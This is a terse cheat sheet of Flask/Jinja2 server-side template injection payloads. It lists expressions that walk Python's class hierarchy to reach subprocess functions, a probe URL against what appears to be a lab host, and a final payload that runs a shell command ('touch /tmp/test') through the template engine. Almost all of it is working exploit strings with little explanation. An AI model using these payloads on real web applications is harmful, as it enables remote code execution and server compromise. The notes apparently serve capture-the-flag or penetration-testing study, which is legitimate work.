# flask/jinja2
Lots of writeups on this; google it. 

## rce
Find all classes
- {{''.__class__.mro()[1].__subclasses__()}} 
- {{ [].__class__.base.__subclasses__() }}



From there it's just a matter of finding the right array indexes to access
things like popen or subprocess

May have to poke around more
- http://ptl-bc1183e6-6992a7f1.libcurl.st/invalid%7B%7B[].class%7D%7D

-
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[229]([\"touch /tmp/test\"], shell=True) }}
